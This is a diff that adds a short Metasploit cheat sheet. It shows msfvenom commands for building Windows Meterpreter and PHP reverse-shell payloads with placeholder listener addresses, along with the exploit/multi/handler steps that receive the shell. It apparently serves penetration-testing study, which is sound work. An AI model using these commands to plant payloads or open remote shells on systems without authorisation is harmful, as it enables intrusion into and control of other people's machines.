@@ -1,0 +1,30 @@
+Usage:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST> LPORT=<LOCAL_PORT> -f exe > rev_shell.exe
+
+Options:
+  -p      Payload
+  -f      Format
+  -e      Encoder
+  LHOST   Local host
+  LPORT   Local port (Listening port)
+  RHOST   Remote host
+
+Commands:
+  msfvenom -l payloads      Show all payloads available
+  msfvenom --list formats   List supported output formats. You can either generate stand-alone payloads 
+                            (Windows executable for Meterpreter) or get a usable raw format (e.g. python)
+  msfvenom -f raw -e php/base64
+                            Encoding (with the -e parameter), in Base64, and the output format generate as raw. Encoders do not aim
+                            to bypass antivirus installed on the target system. As the name suggests, they encode the payload
+
+
+Example Using Handler for Reverse Shell:
+  msfvenom -p php/reverse_php LHOST=<LOCAL>IP> LPORT=<LOCAL_PORT> -f raw > reverse_shell.php
+                              Generate reverse shell payload, use the same values to set up exploit/multi/handler module (listener)
+  use exploit/multi/handler   Use Multi Handler to receive the incoming connection. Multi handler supports all Metasploit payloads
+                              and can be used for Meterpreter as well as regular shells
+  set payload php/reverse_php
+  set lhost <LOCAL_IP>
+  set lport <LOCAL_PORT>
+  run                         When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a *shell*
+                              If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a *Meterpreter shell*
